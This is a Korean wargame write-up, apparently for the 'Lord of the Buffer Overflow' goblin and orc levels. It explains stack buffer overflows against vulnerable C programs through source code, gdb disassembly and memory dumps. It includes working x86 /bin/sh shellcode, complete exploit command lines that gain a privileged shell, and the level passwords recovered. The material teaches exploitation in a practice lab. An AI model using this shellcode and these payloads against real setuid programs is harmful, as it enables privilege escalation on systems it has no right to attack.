@@ -1,0 +1,327 @@
+1.
+먼저 로그인을 해주고
+
+ls -al 을 해주면 파일이 두개가있다 먼저 .c 소스파일을 열어보자
+
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+
+
+일단은 입력받는 함수가 gets 이기떄문에 gets을 이용한 버퍼오버플로우 공격을 하면 쉘을 구할수있으므로
+
+대강 페이로드 구성은 버퍼 + ret 주소 이용하면 다음 쉘 쉽게 얻을수있음 !
+
+버퍼 16 바이트 + stp 4바이트 + ret 주소 4바이트 총 24바이트 
+
+
+따라서 ret주소를 제외한 버퍼는
+
+stp 4 바이트
+
+16 +  4 =20
+
+
+페이로드는 ??
+
+20 + ret주소 
+
+ret주소를 구하려면 환경변수를 등록해야한다.
+
+export code=$(python -c 'print"A"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+
+등록해주고 gcc -o code code.c 해주고 나온 컴파일을 실행하면
+
+ret 주소를 얻을수있다.
+
+ret 주소 >> 0xbffffea7
+
+페이로드 작성
+
+(python -c 'print"\x90"*20+"\xa7\xfe\xff\xbf"';cat)|./goblin
+
+쉘을 얻을수있다.
+
+id
+uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)
+my-pass
+euid = 503
+hackers proof
+
+
+
+2.
+
+먼저 로그인을 해주고
+
+소스코드를 열어본다.
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;				# extern 다른 외부함수 참조할떄 씀
+
+main(int argc, char *argv[])
+{
+        char buffer[40];
+        int i;
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        // egghunter			# egghunter 에그헌터는 환경변수를 전부 지운다는 소리이다.
+        for(i=0; environ[i]; i++)						# 이 코드가 환경변수를 모두 출력하는 코드
+                memset(environ[i], 0, strlen(environ[i]));			# memset >> 연속된 메모리값을 지정할떄 for 문보다 빠름
+
+# 따라서  return address 로 스택의 주소만 허용한다.
+
+        if(argv[1][47] != '\xbf')						
+        {
+                printf("stack is still your friend.\n");
+                exit(0);
+        }
+
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+}
+
+
+일단 소스코드를 해석해보자.
+
+
+
+[goblin@localhost goblin]$ gdb -q orc
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048500 <main>:       push   %ebp
+0x8048501 <main+1>:     mov    %ebp,%esp
+0x8048503 <main+3>:     sub    %esp,44
+0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
+0x804850a <main+10>:    jg     0x8048523 <main+35>
+0x804850c <main+12>:    push   0x8048630
+0x8048511 <main+17>:    call   0x8048410 <printf>
+0x8048516 <main+22>:    add    %esp,4
+0x8048519 <main+25>:    push   0
+0x804851b <main+27>:    call   0x8048420 <exit>
+0x8048520 <main+32>:    add    %esp,4
+0x8048523 <main+35>:    nop
+0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
+0x804852b <main+43>:    nop
+0x804852c <main+44>:    lea    %esi,[%esi*1]
+0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
+0x8048533 <main+51>:    lea    %edx,[%eax*4]
+0x804853a <main+58>:    mov    %eax,%ds:0x8049750
+0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
+0x8048543 <main+67>:    jne    0x8048547 <main+71>
+0x8048545 <main+69>:    jmp    0x8048587 <main+135>
+0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
+---Type <return> to continue, or q <return> to quit---
+0x804854a <main+74>:    lea    %edx,[%eax*4]
+0x8048551 <main+81>:    mov    %eax,%ds:0x8049750
+0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
+0x8048559 <main+89>:    push   %edx
+0x804855a <main+90>:    call   0x80483f0 <strlen>
+0x804855f <main+95>:    add    %esp,4
+0x8048562 <main+98>:    mov    %eax,%eax
+0x8048564 <main+100>:   push   %eax
+0x8048565 <main+101>:   push   0
+0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
+0x804856a <main+106>:   lea    %edx,[%eax*4]
+0x8048571 <main+113>:   mov    %eax,%ds:0x8049750
+0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
+0x8048579 <main+121>:   push   %edx
+0x804857a <main+122>:   call   0x8048430 <memset>
+0x804857f <main+127>:   add    %esp,12
+0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
+0x8048585 <main+133>:   jmp    0x8048530 <main+48>
+0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
+0x804858a <main+138>:   add    %eax,4
+0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
+0x804858f <main+143>:   add    %edx,47
+0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
+---Type <return> to continue, or q <return> to quit---
+0x8048595 <main+149>:   je     0x80485b0 <main+176>
+0x8048597 <main+151>:   push   0x804863c
+0x804859c <main+156>:   call   0x8048410 <printf>
+0x80485a1 <main+161>:   add    %esp,4
+0x80485a4 <main+164>:   push   0
+0x80485a6 <main+166>:   call   0x8048420 <exit>
+0x80485ab <main+171>:   add    %esp,4
+0x80485ae <main+174>:   mov    %esi,%esi
+0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
+0x80485b3 <main+179>:   add    %eax,4
+0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
+0x80485b8 <main+184>:   push   %edx
+0x80485b9 <main+185>:   lea    %eax,[%ebp-40]
+0x80485bc <main+188>:   push   %eax
+0x80485bd <main+189>:   call   0x8048440 <strcpy>
+0x80485c2 <main+194>:   add    %esp,8
+0x80485c5 <main+197>:   lea    %eax,[%ebp-40]
+0x80485c8 <main+200>:   push   %eax
+0x80485c9 <main+201>:   push   0x8048659
+0x80485ce <main+206>:   call   0x8048410 <printf>
+0x80485d3 <main+211>:   add    %esp,8
+0x80485d6 <main+214>:   leave
+0x80485d7 <main+215>:   ret
+
+
+
+
+일단 버퍼가 main +185 를 보면 40 바이트
+
+즉 ret 주소를 제외한 버퍼는 44바이트 !  이제 
+
+페이로드는
+
+./orc `python -c 'print "쉘코드"+"nop"*(44-쉘코드크기)+buffer시작위치
+
+인데 strcpy 쪽 을 브레이크걸어서 주소를 알아내보자
+
+
+(gdb) b*main+197
+Breakpoint 1 at 0x80485c5
+(gdb) r `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`
+Starting program: /home/goblin/orc `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`
+/bin/bash: /home/goblin/orc: Operation not permitted
+/bin/bash: /home/goblin/orc: Operation not permitted
+
+Program exited with code 01.
+You can't do that without a process to debug.
+(gdb) Quit
+(gdb) quit
+[goblin@localhost goblin]$ cp orc ooo
+[goblin@localhost goblin]$ gdb -q ooo
+(gdb) b*main+197
+Breakpoint 1 at 0x80485c5
+(gdb) r `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`
+Starting program: /home/goblin/ooo `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`
+
+Breakpoint 1, 0x80485c5 in main ()
+(gdb) x/100x $esp
+0xbffffa9c:     0x00000016      0x41414141      0x41414141      0x41414141
+0xbffffaac:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffabc:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffacc:     0xbfbfbfbf      0x00000000      0xbffffb14      0xbffffb20
+0xbffffadc:     0x40013868      0x00000002      0x08048450      0x00000000
+0xbffffaec:     0x08048471      0x08048500      0x00000002      0xbffffb14
+0xbffffafc:     0x08048390      0x0804860c      0x4000ae60      0xbffffb0c
+0xbffffb0c:     0x40013e90      0x00000002      0xbffffc06      0xbffffc17
+0xbffffb1c:     0x00000000      0xbffffc48      0xbffffc6a      0xbffffc74
+0xbffffb2c:     0xbffffc82      0xbffffca1      0xbffffcb0      0xbffffcc9
+0xbffffb3c:     0xbffffce5      0xbffffd04      0xbffffd0f      0xbffffd1d
+0xbffffb4c:     0xbffffd5f      0xbffffd71      0xbffffd86      0xbffffdb9
+0xbffffb5c:     0xbffffdc9      0xbffffdd5      0xbffffdf3      0xbffffdfe
+0xbffffb6c:     0xbffffe0f      0xbffffe20      0xbffffe28      0x00000000
+0xbffffb7c:     0x00000003      0x08048034      0x00000004      0x00000020
+0xbffffb8c:     0x00000005      0x00000006      0x00000006      0x00001000
+0xbffffb9c:     0x00000007      0x40000000      0x00000008      0x00000000
+0xbffffbac:     0x00000009      0x08048450      0x0000000b      0x000001f7
+0xbffffbbc:     0x0000000c      0x000001f7      0x0000000d      0x000001f7
+0xbffffbcc:     0x0000000e      0x000001f7      0x00000010      0x0f8bfbff
+0xbffffbdc:     0x0000000f      0xbffffc01      0x00000000      0x00000000
+0xbffffbec:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffbfc:     0x00000000      0x38366900      0x682f0036      0x2f656d6f
+
+
+이므로  주소는  0xbffffaac 이다.
+
+하지만 이대로 페이로드를 작성하면 한번 복사된후 저장된걸 열어보면 실제 동적프로세서 주소와
+차이가 있기떄문에 소스코드를 새로작성해서 주소를 구해주어야한다.
+
+코드
+
+.c 파일에
+
+strcpy 아래에
+
+printf("[	%x	]\n",buffer);
+
+을 넣어주고 컴파일하자.
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+
+main(int argc, char *argv[])
+{
+        char buffer[40];
+        int i;
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        // egghunter
+        for(i=0; environ[i]; i++)
+                memset(environ[i], 0, strlen(environ[i]));
+
+        if(argv[1][47] != '\xbf')
+        {
+                printf("stack is still your friend.\n");
+                exit(0);
+        }
+
+        strcpy(buffer, argv[1]);
+        printf("%x\n", buffer);
+        printf("%s\n", buffer);
+}
+
+
+
+
+
+그리고 그 컴파일한 파일에 버퍼 오버플로우 공격을해 주소를 알아낸다.
+
+./orr `python -c 'print"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*19+"\xac\xfa\xff\xbf"'`
+
+나온 주소 >> bffffaa0
+
+
+다시 페이로드를 작성하면
+
+./orc `python -c 'print"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*19+"\xa0\xfa\xff\xbf"'`
+1픐h//shh/bin됥PS됣됀?
+                      ?릱릱릱릱릱릱릱릱릱맆??
+
+이렇게 쉘을 얻을수있다. !!
+
+bash$ id
+uid=503(goblin) gid=503(goblin) euid=504(orc) egid=504(orc) groups=503(goblin)
+bash$ my-pass
+euid = 504
+cantata
+
+
+요약
+>> 이렇게 환경변수가 다 날아간 버퍼오버플로우 문제는
+
+환경변수를 대입해서 푸는 방법은 시도하지못한다 그래서 strcpy나 문자열 대입할수있는
+곳에 브레이크를 걸어서 직접 대입을해 스택 주소 위치를 찾고
+
+페이로드를 작성한다. 다만 한번 복사하고 실행한 프로그램은 원래 주소와 다르므로
+
+printf("%x\n", buffer);
+
+한줄을 추가시켜서 본래 동적주소를 얻어낸다.
+
+그리고 새롭게 얻은 주소로 페이로드를 작성한다.
+
+
+./orc `python -c 'print "(??크기)쉘코드"+"\x90"*(버퍼-쉘코드크기)+"얻은 동적주소"'`
+
+
+
+
+
+
